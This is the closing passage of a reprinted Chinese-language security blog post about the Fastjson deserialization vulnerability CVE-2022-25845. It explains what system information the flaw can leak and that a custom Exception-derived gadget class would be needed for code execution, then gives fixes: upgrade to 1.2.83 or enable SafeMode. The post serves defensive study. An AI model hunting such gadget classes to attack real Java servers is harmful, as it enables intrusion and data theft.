+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;System info: host: &#x27;&#x27;, ip: &#x27;&#x27;, os.name: &#x27;&#x27;, os.arch: &#x27;&#x27;, os.version: &#x27;&#x27;, java.version: &#x27;&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>根据应用程序的不同，这些信息最终可能会被存储或发送给攻击者（例如，它可能被写入可远程访问日志）。</p>
+<p>在检查了 ysoserial 等其他知名来源后，我们没有发现任何可以在实际场景中能够导致远程代码执行的gadget类。因此，想要利用这个漏洞进行实际攻击的黑客，需要对被共计的Java应用服务器进行深入研究，以找到一个加载在Classpath中的自定义的Java gadget类。这个类继承自Exception&#x2F;Throwable，并包含可用于获取权限、泄漏数据甚至运行任意代码的相关方法。</p>
+<p>总而言之，我们评估目前这个漏洞似乎并未构成很高风险的威胁。尽管存在一个潜在影响巨大（远程代码执行）的公共PoC漏洞可利用，并且攻击的条件并不是甚微（将不受信任的输入数据传递给特定易受攻击的 API）。最重要的是，必须找到一个合适的gadget类（或许由于一些不太可能的属性根本不存在）来突破特定被攻击的目标。</p>
+</blockquote>
+<h2><span id="如何完全修复-cve-2022-25845">如何完全修复 CVE-2022-25845？</span></h2><blockquote>
+<p>要完全修复 CVE-2022-25845，我们建议将 Fastjson 升级到最新版本，目前为 1.2.83。</p>
+</blockquote>
+<h2><span id="如何降低-cve-2022-25845-风险">如何降低 CVE-2022-25845 风险？</span></h2><blockquote>
+<p>启用 Fastjson 的“Safe Mode”可以减缓这个漏洞风险。</p>
+<p>可以通过执行以下任何一种操作来开启Safe Mode：</p>
+<p>1.通过代码配置 ParserConfig.getGlobalInstance().setSafeMode(true);<br>2.通过JVM启动参数配置 -Dfastjson.parser.safeMode&#x3D;true<br>3.通过Fastjson的配置文件配置项 fastjson.parser.safeMode&#x3D;true</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Fastjson/" rel="tag">Fastjson</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+</section>
+
+
+  <nav id="page-nav" class="clearfix">
+    
+    <a class="prev" rel="prev" href="/tags/Reprint/page/3/">
+      <span class="icon icon-chevron-left"></span>
+      <span class="text">Previous</span>
+    </a>
+    
+    
+  </nav>
+
+        <script>setLoadingBarProgress(60);</script>
+    </main>
+
+    <footer id="footer" class="clearfix">
+
+    
+
+    <div class="social-wrapper">
+        
+            
+                <a href="https://github.com/artchen" class="social github"
+                   target="_blank" rel="external">
+                    <span class="icon icon-github"></span>
+                </a>
+            
+                <a href="/atom.xml" class="social rss"
+                   target="_blank" rel="external">
+                    <span class="icon icon-rss"></span>
+                </a>
+            
+        
+    </div>
+
+    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
+                                                                                    target="_blank">Art Chen</a>.
+    </div>
+    <div>&copy; <a href="/">氕氘氚</a></div>
+
+</footer>
+
+
+    <script>setLoadingBarProgress(80);</script>
+    <div class="overlay"></div>
+</div>
+
+<div class="site-sidebar" id="site-sidebar">
+
+    
+
+    <div class="sidebar-switch clearfix "
+         style="display: none">
+        <a class="dark-btn active" data-toggle="toc">
+            <span class="icon icon-list"></span>
+            <span class="text">Index</span>
+        </a>
+        <a class="dark-btn" data-toggle="bio">
+            <span class="icon icon-person"></span>
+            <span class="text">Bio</span>
+        </a>
+    </div>
+
+    <div class="site-toc "
+         style="display: none">
+        
+            <div class="no-index">No Index</div>
+        
+    </div>
+
+    <div class="site-bio show"
+         style="display: block">
+
+        <div class="about-me clearfix">
+            <div class="avatar">
+                <img src="/img/avatar.png"/>
+            </div>
+            <div class="info">
+                <a class="name dark-btn" href="/about">
+                    Szczecin
+                </a>
+            </div>
+            <div class="info">
+                <span class="item desc">
+                    Open your eyes to see the light in life
+                </span>
+            </div>
+        </div>
+
+        <div class="menu section">
+            <ul class="clearfix">
+                
+                    <li class="left">
+                        <a href="/about"
+                           onfocus="this.blur();"
+                           class="nav-about dark-btn block">
+                            简介
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/archives"
+                           onfocus="this.blur();"
+                           class="nav-archives dark-btn block">
+                            归档
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/categories"
+                           onfocus="this.blur();"
+                           class="nav-categories dark-btn block">
+                            分类
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/tags"
+                           onfocus="this.blur();"
+                           class="nav-tags dark-btn block">
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+
+    </div>
+
+    <div class="shortcuts">
+        <a href="#header" class="top window-nav dark-btn" id="go-top">
+            <span class="icon icon-chevron-thin-up"></span>
+        </a>
+        <a class="close dark-btn" id="sidebar-close">
+            <span class="icon icon-close"></span>
+        </a>
+        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+            <span class="icon icon-chevron-thin-down"></span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>
+
+
+<script src="/js/jquery.fitvids.js"></script>
+
+<script>
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var SEARCH_SERVICE = "";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="/js/app.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+<script>setLoadingBarProgress(100);</script>
+
+</body>
+</html>
